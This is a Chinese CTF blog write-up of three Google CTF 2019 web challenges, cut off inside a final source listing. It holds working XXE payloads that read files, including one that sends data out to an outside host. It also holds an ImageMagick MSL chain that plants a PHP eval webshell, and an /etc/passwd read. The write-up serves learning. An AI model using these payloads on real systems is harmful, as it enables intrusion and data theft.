<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="0x00 前言写篇复盘的小水文文章首发在合天公众号，转载请注意 0x01 BNV题目描述： There is not much to see in this enterprise-ready™ web application. 题目地址： https://bnv.web.ctfcompetition.com/ 题目解答： burp抓包发现传输json数据123456789101112POST /a">
<meta property="og:type" content="article">
<meta property="og:title" content="Google Capture The Flag 2019 (Quals) WP">
<meta property="og:url" content="http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="0x00 前言写篇复盘的小水文文章首发在合天公众号，转载请注意 0x01 BNV题目描述： There is not much to see in this enterprise-ready™ web application. 题目地址： https://bnv.web.ctfcompetition.com/ 题目解答： burp抓包发现传输json数据123456789101112POST /a">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2019/07/18/5d3030f30ebe260056.png">
<meta property="og:image" content="https://i.loli.net/2019/07/18/5d3031174d49928141.png">
<meta property="og:image" content="https://i.loli.net/2019/07/18/5d30312f2941885347.png">
<meta property="og:updated_time" content="2019-08-10T12:58:09.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Google Capture The Flag 2019 (Quals) WP">
<meta name="twitter:description" content="0x00 前言写篇复盘的小水文文章首发在合天公众号，转载请注意 0x01 BNV题目描述： There is not much to see in this enterprise-ready™ web application. 题目地址： https://bnv.web.ctfcompetition.com/ 题目解答： burp抓包发现传输json数据123456789101112POST /a">
<meta name="twitter:image" content="https://i.loli.net/2019/07/18/5d3030f30ebe260056.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Google Capture The Flag 2019 (Quals) WP</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/08/11/De1CTF-2019-wp/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/06/30/Razzer-Finding-Kernel-Race-Bugs-through-Fuzzing/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&text=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&is_video=false&description=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Google Capture The Flag 2019 (Quals) WP&body=Check out this article: http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&title=Google Capture The Flag 2019 (Quals) WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/&name=Google Capture The Flag 2019 (Quals) WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-BNV"><span class="toc-number">2.</span> <span class="toc-text">0x01 BNV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-gLotto"><span class="toc-number">3.</span> <span class="toc-text">0x02 gLotto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-gphotos"><span class="toc-number">4.</span> <span class="toc-text">0x03 gphotos</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Google Capture The Flag 2019 (Quals) WP
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Z3R0YU</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-07-18T08:44:53.000Z" itemprop="datePublished">2019-07-18</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>写篇复盘的小水文<br>文章首发在合天公众号，转载请注意</p>
<h2 id="0x01-BNV"><a href="#0x01-BNV" class="headerlink" title="0x01 BNV"></a>0x01 BNV</h2><p>题目描述：</p>
<p>There is not much to see in this enterprise-ready™ web application.</p>
<p>题目地址：</p>
<p><a href="https://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">https://bnv.web.ctfcompetition.com/</a></p>
<p>题目解答：</p>
<p>burp抓包发现传输json数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: bnv.web.ctfcompetition.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://bnv.web.ctfcompetition.com/</span><br><span class="line">Content-type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>联想到json转换为xxe进行文件读取，首先为了验证猜想直接修改HTTP头Content-type的值为application/xml，重放数据包之后发现报不解析错误，确认了猜想。</p>
<p><img src="https://i.loli.net/2019/07/18/5d3030f30ebe260056.png" alt="83EA2441-2660-437B-8AA6-38E1D4EA37B3.png"></p>
<p>手动把json转换为xxe格式，发现报错说缺少DTD<br><img src="https://i.loli.net/2019/07/18/5d3031174d49928141.png" alt="39377EB4-BF43-4221-9B68-C6AC640C350A.png"></p>
<p>想到之前看到的一个点<a href="https://www.freebuf.com/articles/web/195899.html" target="_blank" rel="noopener">《使用本地DTD文件来利用XXE漏洞实现任意结果输出》</a></p>
<p>所以构造如下paylaod对flag进行读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: bnv.web.ctfcompetition.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://bnv.web.ctfcompetition.com/</span><br><span class="line">Content-type: application/xml</span><br><span class="line">Content-Length: 374</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&apos;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/07/18/5d30312f2941885347.png" alt="2EE1BB38-CEDE-41D0-B076-A55759EC0FFD.png"></p>
<p>最后分享一个<a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">XXE cheat sheet</a> &lt;—有点老了，感觉可以把我的也整理一下发一发？随后有时间再整理吧。</p>
<h2 id="0x02-gLotto"><a href="#0x02-gLotto" class="headerlink" title="0x02 gLotto"></a>0x02 gLotto</h2><p>题目描述：</p>
<p>Are you lucky?</p>
<p>题目链接：</p>
<p><a href="https://glotto.web.ctfcompetition.com/" target="_blank" rel="noopener">https://glotto.web.ctfcompetition.com/</a></p>
<p>题目解答：</p>
<p>点击页面右下角可以看到页面的源码，具体的链接是</p>
<p><a href="https://glotto.web.ctfcompetition.com/?src" target="_blank" rel="noopener">https://glotto.web.ctfcompetition.com/?src</a></p>
<p>从源码中分析我们可以得到以下几点：</p>
<ol>
<li>orderx参数拼接可造注入</li>
<li>orderx对应四个表，轮换查询</li>
<li>每次生成的session会存入数据库中</li>
<li>提交的code跟session相同就可以得到flag，而且判断完就销毁session</li>
</ol>
<p>那么解决问题的关键就是利用注入来获取到之前设置的session值，而且要通过四次orderx参数的注入（order by注入）来完成。</p>
<p>接下来采用数学的方法来解决这个问题</p>
<p><a href="https://cfreal.github.io/google-ctf-2019-glotto-writeup.html" target="_blank" rel="noopener">https://cfreal.github.io/google-ctf-2019-glotto-writeup.html</a></p>
<p>Exp：<br><a href="https://github.com/cfreal/exploits/tree/master/gctf-2019-glotto" target="_blank" rel="noopener">https://github.com/cfreal/exploits/tree/master/gctf-2019-glotto</a></p>
<p>题目的关键部分代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'watchdog.php'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_winner</span><span class="params">($count, $charset=<span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $len = strlen($charset);</span><br><span class="line">        $rand = openssl_random_pseudo_bytes($count);</span><br><span class="line">        $secret = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $count; $i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $secret .= $charset[ord($rand[$i]) % $len];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(highlight_string(file_get_contents(<span class="keyword">__FILE__</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>])) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'winner'</span>])) <span class="keyword">die</span>;</span><br><span class="line">        $win = $_SESSION[<span class="string">'winner'</span>];</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">'winner'</span>]);</span><br><span class="line">        session_destroy();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($_POST[<span class="string">'code'</span>] === $win)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"You won! $flag"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"You didn't win :(&lt;br&gt;The winning ticket was $win"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $tables = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'march'</span>,</span><br><span class="line">        <span class="string">'april'</span>,</span><br><span class="line">        <span class="string">'may'</span>,</span><br><span class="line">        <span class="string">'june'</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $winner = gen_winner(<span class="number">12</span>);</span><br><span class="line">    $_SESSION[<span class="string">'winner'</span>] = $winner;</span><br><span class="line"></span><br><span class="line">    $db = <span class="keyword">new</span> mysqli(<span class="keyword">null</span>, $dbuser, $dbpass, $dbname, <span class="keyword">null</span>, $socket);</span><br><span class="line">    <span class="comment">//$db = new mysqli($dbhost, $dbuser, $dbpass, $dbname);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($db-&gt;connect_errno) &#123;</span><br><span class="line">        printf(<span class="string">"Connect failed: %s\n"</span>, $db-&gt;connect_error);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    $db-&gt;query(<span class="string">"SET @lotto = '$winner'"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($tables); $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $order = <span class="keyword">isset</span>($_GET[<span class="string">"order&#123;$i&#125;"</span>]) ? $_GET[<span class="string">"order&#123;$i&#125;"</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (stripos($order, <span class="string">'benchmark'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>;</span><br><span class="line">        $&#123;<span class="string">"result$i"</span>&#125; = $db-&gt;query(<span class="string">"SELECT * FROM &#123;$tables[$i]&#125; "</span> . ($order != <span class="string">''</span> ? <span class="string">"ORDER BY `"</span>.$db-&gt;escape_string($order).<span class="string">"`"</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="keyword">if</span> (!$&#123;<span class="string">"result$i"</span>&#125;) <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x03-gphotos"><a href="#0x03-gphotos" class="headerlink" title="0x03 gphotos"></a>0x03 gphotos</h2><p>题目描述：</p>
<p>Upload your photoz. FYI: /info.php</p>
<p>题目链接：</p>
<p><a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">http://gphotos.ctfcompetition.com:1337/</a></p>
<p>题目解析：</p>
<p>首先右键源码看源码就额可以看到这个上传功能对应的后端PHP代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gphotos.ctfcompetition.com:1337/?action=src</span><br></pre></td></tr></table></figure></p>
<p>通过阅读代码可以发现以下几点：</p>
<ol>
<li><code>mime_content_type</code>来检测文件的MIME类型并且限制了只能是<code>image/gif</code>, <code>image/png</code>, <code>image/jpeg</code>, <code>image/svg+xml</code> 这四种类型。</li>
<li>之后使用<code>get_size</code>函数，这个函数对<code>image/png</code>, <code>image/jpeg</code>,会检测大小，如果是其它类型就当做xml文件来处理。</li>
<li>在之后就是利用<code>thumbnail</code>函数来得到缩略图，这其中就使用了ImageMagick的 convert命令。</li>
<li>上传文件会被移动到upload目录下，并且后缀是根据对应的MIME类型进行拼接的，文件名是md5之后的hash值，而且图片是经过转换之后的缩略图，所以在图片里面藏shell代码基本不可能的了。</li>
</ol>
<p>但是目标可以处理svg图，<del>那么就明显是要使用XXE漏洞来达到攻击的目的了。</del> XXE只是帮助我获取ImageMagick的配置文件，这里有一个小trick，就是在带外传输数据的时候如何传输过长的数据。</p>
<p>上传如下svg图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line"> &lt;!DOCTYPE foo [  </span><br><span class="line">   &lt;!ELEMENT svg ANY &gt;</span><br><span class="line">   &lt;!ENTITY % remote SYSTEM &quot;http://bushwhackers.ru:8003/ev.xml&quot; &gt;</span><br><span class="line">%remote;%template;</span><br><span class="line">   ]&gt;&lt;svg&gt;&amp;res;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>ev.xml文件的内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % secret SYSTEM &quot;THING_TO_STEAL&quot; &gt;</span><br><span class="line">&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM &apos;http://bushwhackers.ru:8003/a?%secret;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是此时的ev.xml对于直接传输一个文件而言还是不好用，所以借助php的伪协议来助攻一下。总之就是压缩之后进行base64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % secret SYSTEM &quot;php://filter/convert.base64-encode/resource=php://filter/zlib.deflate/resource=file:///etc/ImageMagick-6/policy.xml&quot; &gt;</span><br><span class="line">&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM &apos;http://bushwhackers.ru:8003/a?%secret;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>之后的paylaod还是借助ImageMagick在处理特殊的msl文件时会执行其中的命令来触发(这个特性好像只在debain上存在)，具体的攻击流程如下：</p>
<p>首先使用如下命令生成包含webshell的png，上传之后主页会返回路径和文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -size 100x100 -comment &apos;&lt;?php eval($_GET[&quot;cmd&quot;]); ?&gt;&apos; rgba:/dev/urandom[0] shell.png</span><br></pre></td></tr></table></figure></p>
<p>返回内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png</span><br></pre></td></tr></table></figure></p>
<p>PS: 注意使用bash不要用zsh</p>
<p>之后上传我们的svg图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!-- &lt;svg&gt; --&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">  &lt;read filename=&quot;/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png&quot; /&gt;</span><br><span class="line">  &lt;write filename=&quot;/var/www/html/upload/shell_huihui.php&quot; /&gt;</span><br><span class="line">  &lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">    &lt;image href=&quot;/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png&quot; /&gt;</span><br><span class="line">  &lt;/svg&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure></p>
<p>返回内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/&lt;hash&gt;/&lt;image2&gt;.svg</span><br></pre></td></tr></table></figure></p>
<p>最后再上传如下的svg来将上一个svg内容进行执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">  &lt;image width=&quot;120&quot; height=&quot;120&quot; href=&quot;msl:/var/www/html/upload/&lt;hash&gt;/&lt;image2&gt;.svg&quot; /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p>
<p>最后执行在webroot目录下的webshell即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gphotos2.ctfcompetition.com:1337/upload/shell_huihui.php?cmd=system(&apos;/get_flag&apos;)</span><br></pre></td></tr></table></figure>
<p>这里学到的几个点：</p>
<ol>
<li>XXE带外传输大文件的方法</li>
<li>Debians+不安全的ImageMagick配置将会导致href标签的伪协议读文件或者是配合msl文件执行命令</li>
</ol>
<p>like<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">  &lt;image width=&quot;120&quot; height=&quot;120&quot; href=&quot;text:/etc/passwd&quot; /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p>
<p>网站的关键源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 